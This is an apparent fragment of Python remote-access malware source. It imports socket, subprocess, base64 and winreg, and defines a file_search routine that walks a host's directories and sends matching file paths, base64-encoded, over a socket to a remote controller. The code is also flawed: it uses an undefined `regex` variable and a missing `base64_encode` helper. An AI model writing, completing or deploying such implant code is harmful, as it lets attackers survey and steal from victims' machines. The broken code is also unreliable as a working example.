#!/usr/bin/env python3

import socket, subprocess, time, argparse, base64, platform, threading, os, winreg, re



def regex_search(regex, data):
    """This function searches the data for a regex match

    Args:
        regex (str): The regex to search for
        data (str): The data to search

    Returns:
        str: The regex match
    """
    match = re.search(regex, data)
    if match:
        return match.group(1)
    else:
        return "None"

def file_search(socket, file_name, starting_directory, search_exp=''):
    # Loop through the directories

    found_files = b''

    if regex == False:
        for root, dirs, filenames in os.walk(starting_directory):
            # Loop through the files
            for file in filenames:
                # If the file name matches the file we are looking for
                if file == file_name:
                    # send the absolute path of the file
                    # TODO: prompt the user to download the file
                    socket.sendall(base64_encode( b'File found at' + os.path.join(root, file).encode()))
                    return
                else:
                    socket.sendall(base64_encode(b'File not found'))
    else:
        for root, dirs, filenames in os.walk(starting_directory):
            # Loop through the files
            for file in filenames:
                # If the file name matches the file we are looking for
                if regex_search(search_exp, file):
                    # send the absolute path of the file
                    found_files += os.path.join(root, file).encode() + b'\n'
                    socket.sendall(base64_encode(found_files))
                else:
                    socket.sendall(base64_encode(b'No matching files found'))
                